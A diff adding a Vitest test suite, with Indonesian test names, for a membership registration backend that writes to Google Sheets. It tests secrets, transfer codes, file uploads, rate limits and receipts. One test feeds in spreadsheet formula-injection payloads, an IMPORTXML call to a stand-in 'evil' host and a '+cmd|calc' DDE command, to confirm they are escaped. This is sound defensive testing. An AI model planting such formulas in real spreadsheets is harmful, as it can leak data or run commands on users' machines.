@@ -1,0 +1,389 @@
+import { describe, expect, it } from 'vitest'
+import { MEMBERSHIP_PRICES } from '@/lib/membership/config'
+import { createRegistryEnv, type RegistryEnv } from './fakes'
+
+const JPEG = [0xff, 0xd8, 0xff, 0xe0, 0x00, 0x10, 0x4a, 0x46, 0x49, 0x46]
+const PNG = [0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0, 0, 0, 0]
+const PDF = Array.from(Buffer.from('%PDF-1.7\n%test\n'))
+const EXE = [0x4d, 0x5a, 0x90, 0x00, 0x03, 0, 0, 0]
+const b64 = (bytes: number[], pad = 0) => Buffer.from([...bytes, ...new Array(pad).fill(1)]).toString('base64')
+
+const person = {
+  name: 'Siti Uji',
+  email: 'siti@example.com',
+  whatsapp: '081234567890',
+  occupation: 'Dosen',
+  position: 'Kaprodi',
+  institution: 'Universitas Uji',
+  country: 'ID',
+  locale: 'id',
+  consent: true,
+}
+
+function reserve(env: RegistryEnv, category = 'student', ip = '1.1.1.1') {
+  return env.call({ action: 'reserve', category, ip })
+}
+function upload(env: RegistryEnv, bytes = JPEG, mime = 'image/jpeg', ip = '1.1.1.1') {
+  return env.call({ action: 'upload', mime, dataBase64: b64(bytes), ip })
+}
+/** Alur lengkap reserve -> upload -> register. */
+function fullRegister(env: RegistryEnv, over: Record<string, unknown> = {}, category = 'student') {
+  const r = reserve(env, category)
+  const u = upload(env)
+  return {
+    r,
+    u,
+    res: env.call({ action: 'register', category, reservationToken: r.token, uploadToken: u.uploadToken, ip: '1.1.1.1', ...person, ...over }),
+  }
+}
+const regRows = (env: RegistryEnv) => env.ss.getSheetByName('Pendaftaran')!.rows.slice(1)
+const H = (env: RegistryEnv, name: string) => (env.ss.getSheetByName('Pendaftaran')!.rows[0] as string[]).indexOf(name)
+
+describe('spreadsheet awal', () => {
+  it('memakai tab kosong Sheet1 sebagai tab Pendaftaran (tanpa tab sisa)', () => {
+    const env = createRegistryEnv({ starterSheet: true })
+    expect(reserve(env).ok).toBe(true)
+    expect(env.ss.getSheetByName('Sheet1')).toBeNull()
+    const reg = env.ss.getSheetByName('Pendaftaran')!
+    expect(reg.rows[0][1]).toBe('No. Pendaftaran')
+    expect(env.ss.getSheetByName('Reservasi')).not.toBeNull()
+  })
+
+  it('tidak menimpa Sheet1 yang sudah berisi data', () => {
+    const env = createRegistryEnv()
+    const starter = env.ss.insertSheet('Sheet1')
+    starter.appendRow(['data penting'])
+    reserve(env)
+    expect(env.ss.getSheetByName('Sheet1')!.rows[0][0]).toBe('data penting')
+    expect(env.ss.getSheetByName('Pendaftaran')).not.toBeNull()
+  })
+})
+
+describe('keamanan akses', () => {
+  it('menolak permintaan tanpa atau dengan secret salah', () => {
+    const env = createRegistryEnv()
+    expect(env.call({ action: 'reserve', category: 'student', secret: '' }).error).toBe('unauthorized')
+    expect(env.call({ action: 'reserve', category: 'student', secret: 'salah' }).error).toBe('unauthorized')
+    expect(env.ss.getSheetByName('Pendaftaran')).toBeNull() // tidak menyentuh Sheet
+  })
+
+  it('menolak bila API_SECRET belum dipasang di skrip', () => {
+    const env = createRegistryEnv({ secret: null })
+    expect(env.call({ action: 'reserve', category: 'student' }).error).toBe('not_configured')
+  })
+
+  it('aksi tidak dikenal ditolak', () => {
+    expect(createRegistryEnv().call({ action: 'hapusSemua' }).error).toBe('unknown_action')
+  })
+
+  it('kunci selalu dilepas, termasuk saat galat', () => {
+    const env = createRegistryEnv()
+    reserve(env)
+    env.call({ action: 'register', category: 'student', reservationToken: 'x', uploadToken: 'y', ...person })
+    env.call({ action: 'upload', mime: 'image/png', dataBase64: b64(EXE) })
+    expect(env.lock.held).toBe(0)
+    expect(env.lock.acquired).toBe(env.lock.released)
+    expect(env.lock.acquired).toBe(3)
+  })
+
+  it('harga di skrip sama dengan konfigurasi website', () => {
+    const env = createRegistryEnv()
+    for (const [category, price] of Object.entries(MEMBERSHIP_PRICES)) {
+      const r = env.call({ action: 'reserve', category, ip: category })
+      expect(r.transferAmount).toBe(price + r.uniqueCode)
+    }
+  })
+})
+
+describe('reservasi kode unik transfer', () => {
+  it('kode 1–999 dan nominal = harga + kode', () => {
+    const env = createRegistryEnv()
+    const r = reserve(env, 'professional')
+    expect(r.ok).toBe(true)
+    expect(r.uniqueCode).toBeGreaterThanOrEqual(1)
+    expect(r.uniqueCode).toBeLessThanOrEqual(999)
+    expect(r.transferAmount).toBe(500_000 + r.uniqueCode)
+    expect(r.token).toMatch(/^[0-9a-f]{64}$/)
+  })
+
+  it('kategori tidak sah ditolak', () => {
+    expect(reserve(createRegistryEnv(), 'vip').error).toBe('invalid_category')
+  })
+
+  it('dua pemesan tidak pernah mendapat kode yang sama pada kategori yang sama', () => {
+    const env = createRegistryEnv()
+    const codes = new Set<number>()
+    for (let i = 0; i < 9; i++) codes.add(env.call({ action: 'reserve', category: 'student', ip: `10.0.0.${i}` }).uniqueCode)
+    expect(codes.size).toBe(9)
+  })
+
+  it('tersisa satu kode: kode itu yang diberikan; sesudahnya habis', () => {
+    const env = createRegistryEnv()
+    reserve(env) // membuat tab
+    const res = env.ss.getSheetByName('Reservasi')!
+    res.rows.length = 1
+    const future = new Date(Date.now() + 3600_000)
+    for (let c = 1; c <= 999; c++) if (c !== 500) res.appendRow([`t${c}`, 'student', c, future, '', ''])
+    const last = env.call({ action: 'reserve', category: 'student', ip: 'a' })
+    expect(last.uniqueCode).toBe(500)
+    expect(env.call({ action: 'reserve', category: 'student', ip: 'b' }).error).toBe('codes_exhausted')
+    // kategori lain tidak terpengaruh
+    expect(env.call({ action: 'reserve', category: 'professional', ip: 'c' }).ok).toBe(true)
+  })
+
+  it('pesanan kedaluwarsa dibersihkan dan kodenya bebas lagi', () => {
+    const env = createRegistryEnv()
+    const first = reserve(env)
+    env.setNow(new Date(Date.now() + 25 * 3600_000))
+    reserve(env, 'student', '2.2.2.2')
+    const tokens = env.ss.getSheetByName('Reservasi')!.rows.slice(1).map((r) => r[0])
+    expect(tokens).not.toContain(first.token)
+  })
+
+  it('kode milik pendaftaran yang masih menunggu verifikasi tidak dipakai ulang', () => {
+    const env = createRegistryEnv()
+    const { res } = fullRegister(env)
+    expect(res.ok).toBe(true)
+    const used = Number(regRows(env)[0][H(env, 'Kode Unik')])
+    // paksa semua kode selain `used` terpakai: sisa kosong hanya `used`, yang harus tetap ditolak
+    const sh = env.ss.getSheetByName('Reservasi')!
+    const future = new Date(Date.now() + 3600_000)
+    for (let c = 1; c <= 999; c++) if (c !== used) sh.appendRow([`z${c}`, 'student', c, future, '', ''])
+    expect(env.call({ action: 'reserve', category: 'student', ip: 'q' }).error).toBe('codes_exhausted')
+  })
+})
+
+describe('unggah bukti transfer', () => {
+  it('menerima JPEG, PNG, dan PDF; berkas tersimpan privat', () => {
+    const env = createRegistryEnv()
+    for (const [bytes, mime] of [[JPEG, 'image/jpeg'], [PNG, 'image/png'], [PDF, 'application/pdf']] as const) {
+      const r = upload(env, [...bytes], mime)
+      expect(r.ok).toBe(true)
+      expect(r.uploadToken).toMatch(/^[0-9a-f]{64}$/)
+    }
+    expect(env.files.size).toBe(3)
+    for (const f of env.files.values()) expect(f.sharing).toBe('PRIVATE')
+    expect(env.ss.getSheetByName('Unggahan')!.hidden).toBe(true)
+  })
+
+  it('menolak .exe yang menyamar sebagai gambar', () => {
+    const env = createRegistryEnv()
+    expect(upload(env, EXE, 'image/png').error).toBe('invalid_file_type')
+    expect(upload(env, EXE, 'application/pdf').error).toBe('invalid_file_type')
+    expect(env.files.size).toBe(0)
+  })
+
+  it('menolak jika tipe yang diklaim tidak cocok dengan isi', () => {
+    expect(upload(createRegistryEnv(), PNG, 'image/jpeg').error).toBe('invalid_file_type')
+  })
+
+  it('menolak tipe yang tidak diizinkan dan berkas kosong atau base64 rusak', () => {
+    const env = createRegistryEnv()
+    expect(upload(env, JPEG, 'image/gif').error).toBe('invalid_file_type')
+    expect(env.call({ action: 'upload', mime: 'image/jpeg', dataBase64: '' }).error).toBe('invalid_file')
+    expect(env.call({ action: 'upload', mime: 'image/jpeg', dataBase64: '###' }).error).toBe('invalid_file')
+  })
+
+  it('batas ukuran 4 MB', () => {
+    const env = createRegistryEnv()
+    const max = 4 * 1024 * 1024
+    expect(env.call({ action: 'upload', mime: 'image/jpeg', dataBase64: b64(JPEG, max - JPEG.length) }).ok).toBe(true)
+    expect(env.call({ action: 'upload', mime: 'image/jpeg', dataBase64: b64(JPEG, max - JPEG.length + 1) }).error).toBe('file_too_large')
+  })
+
+  it('pembatas laju: unggahan ke-11 dari IP yang sama ditolak', () => {
+    const env = createRegistryEnv()
+    const results = Array.from({ length: 11 }, () => upload(env, JPEG, 'image/jpeg', '9.9.9.9'))
+    expect(results.slice(0, 10).every((r) => r.ok)).toBe(true)
+    expect(results[10].error).toBe('rate_limited')
+    expect(upload(env, JPEG, 'image/jpeg', '8.8.8.8').ok).toBe(true)
+  })
+})
+
+describe('pendaftaran jalur A', () => {
+  it('menyimpan satu baris lengkap dengan nomor INP-yy-S-0001', () => {
+    const env = createRegistryEnv()
+    const { r, res } = fullRegister(env)
+    expect(res.ok).toBe(true)
+    expect(res.regNumber).toMatch(/^INP-\d{2}-S-0001$/)
+    expect(res.status).toBe('Menunggu Verifikasi')
+    expect(res.transferAmount).toBe(r.transferAmount)
+    const row = regRows(env)[0]
+    expect(row[H(env, 'Nama Lengkap')]).toBe('Siti Uji')
+    expect(row[H(env, 'Email')]).toBe('siti@example.com')
+    expect(row[H(env, 'Kode Unik')]).toBe(r.uniqueCode)
+    expect(row[H(env, 'Nominal Transfer (Rp)')]).toBe(250_000 + r.uniqueCode)
+    expect(row[H(env, 'Status')]).toBe('Menunggu Verifikasi')
+    expect(row[H(env, 'Negara')]).toBe('ID')
+    expect(row[H(env, 'No. Anggota')]).toBe(res.regNumber)
+    expect(String(row[H(env, 'Bukti Transfer')])).toMatch(/^=HYPERLINK\("https:\/\/drive\.google\.com\/file\/d\/[^"]+\/view"/)
+  })
+
+  it('nomor berurutan per kategori dan terpisah antar kategori', () => {
+    const env = createRegistryEnv()
+    const a = fullRegister(env).res.regNumber
+    const b = fullRegister(env, { email: 'b@example.com' }).res.regNumber
+    const c = fullRegister(env, { email: 'c@example.com' }, 'professional').res.regNumber
+    expect(a).toMatch(/-S-0001$/)
+    expect(b).toMatch(/-S-0002$/)
+    expect(c).toMatch(/-P-0001$/)
+  })
+
+  it('tahun pada nomor mengikuti WIB dan urutan mulai lagi tiap tahun', () => {
+    const env = createRegistryEnv()
+    env.setNow(new Date('2026-12-31T16:30:00Z')) // 31 Des 2026 23:30 WIB
+    expect(fullRegister(env).res.regNumber).toBe('INP-26-S-0001')
+    env.setNow(new Date('2026-12-31T17:30:00Z')) // 1 Jan 2027 00:30 WIB
+    expect(fullRegister(env, { email: 'x@example.com' }).res.regNumber).toBe('INP-27-S-0001')
+  })
+
+  it('berkas bukti diberi nama sesuai nomor pendaftaran', () => {
+    const env = createRegistryEnv()
+    const { res } = fullRegister(env)
+    expect([...env.files.values()].map((f) => f.name)).toEqual([`${res.regNumber}.jpg`])
+  })
+
+  it('pengiriman ganda (klik dua kali) mengembalikan pendaftaran yang sama, tanpa baris ganda', () => {
+    const env = createRegistryEnv()
+    const r = reserve(env)
+    const u = upload(env)
+    const payload = { action: 'register', category: 'student', reservationToken: r.token, uploadToken: u.uploadToken, ip: '1.1.1.1', ...person }
+    const first = env.call(payload)
+    const second = env.call(payload)
+    expect(second.regNumber).toBe(first.regNumber)
+    expect(second.receiptToken).toBe(first.receiptToken)
+    expect(regRows(env)).toHaveLength(1)
+  })
+
+  it('pesanan yang sudah dipakai orang lain tidak bisa dipakai ulang', () => {
+    const env = createRegistryEnv()
+    const r = reserve(env)
+    const u1 = upload(env)
+    env.call({ action: 'register', category: 'student', reservationToken: r.token, uploadToken: u1.uploadToken, ...person })
+    const u2 = upload(env)
+    const other = env.call({ action: 'register', category: 'student', reservationToken: r.token, uploadToken: u2.uploadToken, ...person, email: 'lain@example.com' })
+    expect(other.error).toBe('reservation_used')
+    expect(regRows(env)).toHaveLength(1)
+  })
+
+  it('token unggahan hanya sekali pakai', () => {
+    const env = createRegistryEnv()
+    const u = upload(env)
+    const r1 = reserve(env)
+    expect(env.call({ action: 'register', category: 'student', reservationToken: r1.token, uploadToken: u.uploadToken, ...person }).ok).toBe(true)
+    const r2 = reserve(env)
+    expect(env.call({ action: 'register', category: 'student', reservationToken: r2.token, uploadToken: u.uploadToken, ...person, email: 'b@example.com' }).error).toBe('upload_not_found')
+  })
+
+  it('menolak: pesanan tidak ada, kategori tidak cocok, Corporate, tanpa persetujuan', () => {
+    const env = createRegistryEnv()
+    const u = upload(env)
+    const r = reserve(env, 'professional')
+    const base = { action: 'register', uploadToken: u.uploadToken, ...person }
+    expect(env.call({ ...base, category: 'student', reservationToken: 'tidak-ada' }).error).toBe('reservation_not_found')
+    expect(env.call({ ...base, category: 'student', reservationToken: r.token }).error).toBe('reservation_mismatch')
+    expect(env.call({ ...base, category: 'corporate', reservationToken: r.token }).error).toBe('corporate_flow')
+    expect(env.call({ ...base, category: 'professional', reservationToken: r.token, consent: false }).error).toBe('consent_required')
+    expect(regRows(env)).toHaveLength(0)
+  })
+
+  it('memvalidasi setiap kolom data diri', () => {
+    const env = createRegistryEnv()
+    const cases: [Record<string, unknown>, string][] = [
+      [{ name: 'A' }, 'invalid_name'],
+      [{ email: 'bukan-email' }, 'invalid_email'],
+      [{ whatsapp: '123' }, 'invalid_whatsapp'],
+      [{ occupation: '' }, 'invalid_occupation'],
+      [{ institution: ' ' }, 'invalid_institution'],
+      [{ country: 'Indonesia' }, 'invalid_country'],
+    ]
+    for (const [over, error] of cases) {
+      const { res } = fullRegister(env, over)
+      expect(res.error, JSON.stringify(over)).toBe(error)
+    }
+    expect(regRows(env)).toHaveLength(0)
+  })
+
+  it('pesanan yang lewat masa berlaku tetapi belum diambil alih masih bisa dipakai', () => {
+    const env = createRegistryEnv()
+    const r = reserve(env)
+    const u = upload(env)
+    env.setNow(new Date(Date.now() + 30 * 3600_000))
+    const res = env.call({ action: 'register', category: 'student', reservationToken: r.token, uploadToken: u.uploadToken, ...person })
+    expect(res.ok).toBe(true)
+    expect(res.transferAmount).toBe(r.transferAmount)
+  })
+
+  it('mencegah injeksi rumus Google Sheet', () => {
+    const env = createRegistryEnv()
+    const { res } = fullRegister(env, {
+      name: '=IMPORTXML("http://evil","//x")',
+      institution: '+cmd|calc',
+      occupation: '@SUM(1)',
+      position: '-2+3',
+    })
+    expect(res.ok).toBe(true)
+    const row = regRows(env)[0]
+    expect(row[H(env, 'Nama Lengkap')]).toBe(`'=IMPORTXML("http://evil","//x")`)
+    expect(row[H(env, 'Institusi')]).toBe("'+cmd|calc")
+    expect(row[H(env, 'Pekerjaan')]).toBe("'@SUM(1)")
+    expect(row[H(env, 'Jabatan')]).toBe("'-2+3")
+  })
+
+  it('membersihkan karakter kontrol dan memotong teks terlalu panjang', () => {
+    const env = createRegistryEnv()
+    const { res } = fullRegister(env, { name: 'Siti\n\u0000Uji', institution: 'U'.repeat(500) })
+    expect(res.ok).toBe(true)
+    const row = regRows(env)[0]
+    expect(row[H(env, 'Nama Lengkap')]).toBe('Siti Uji')
+    expect(String(row[H(env, 'Institusi')])).toHaveLength(160)
+  })
+
+  it('mengirim notifikasi ke Bendahara tanpa memuat email atau WhatsApp pendaftar', () => {
+    const env = createRegistryEnv()
+    const { res } = fullRegister(env)
+    expect(env.mails).toHaveLength(1)
+    expect(env.mails[0].to).toBe('asosiasi.inopi@gmail.com')
+    expect(env.mails[0].subject).toContain(res.regNumber)
+    expect(env.mails[0].body).not.toContain('081234567890')
+    expect(env.mails[0].body).not.toContain('siti@example.com')
+  })
+
+  it('token terima kasih dan token verifikasi acak, panjang, dan berbeda', () => {
+    const env = createRegistryEnv()
+    const row = (fullRegister(env), regRows(env)[0])
+    const t1 = String(row[H(env, 'Token Terima Kasih')])
+    const t2 = String(row[H(env, 'Token Verifikasi')])
+    expect(t1).toMatch(/^[0-9a-f]{64}$/)
+    expect(t2).toMatch(/^[0-9a-f]{64}$/)
+    expect(t1).not.toBe(t2)
+  })
+
+  it('pembatas laju pendaftaran: ke-9 dari IP yang sama ditolak', () => {
+    const env = createRegistryEnv()
+    const results = Array.from({ length: 9 }, () => env.call({ action: 'register', category: 'student', reservationToken: 'x', uploadToken: 'y', ip: '7.7.7.7', ...person }))
+    expect(results.slice(0, 8).every((r) => r.error === 'reservation_not_found')).toBe(true)
+    expect(results[8].error).toBe('rate_limited')
+  })
+})
+
+describe('tanda terima', () => {
+  it('ditemukan lewat token acak, bukan nomor pendaftaran', () => {
+    const env = createRegistryEnv()
+    const { res } = fullRegister(env)
+    const got = env.call({ action: 'receipt', receiptToken: res.receiptToken })
+    expect(got).toMatchObject({ ok: true, regNumber: res.regNumber, category: 'student', status: 'Menunggu Verifikasi', locale: 'id' })
+    expect(got.verifyToken).toMatch(/^[0-9a-f]{64}$/)
+    expect(env.call({ action: 'receipt', receiptToken: res.regNumber }).error).toBe('not_found')
+    expect(env.call({ action: 'receipt', receiptToken: '' }).error).toBe('not_found')
+  })
+
+  it('tidak memuat email, WhatsApp, atau data pribadi lain', () => {
+    const env = createRegistryEnv()
+    const { res } = fullRegister(env)
+    const text = JSON.stringify(env.call({ action: 'receipt', receiptToken: res.receiptToken }))
+    expect(text).not.toContain('siti@example.com')
+    expect(text).not.toContain('081234567890')
+    expect(text).not.toContain('Siti Uji')
+  })
+})
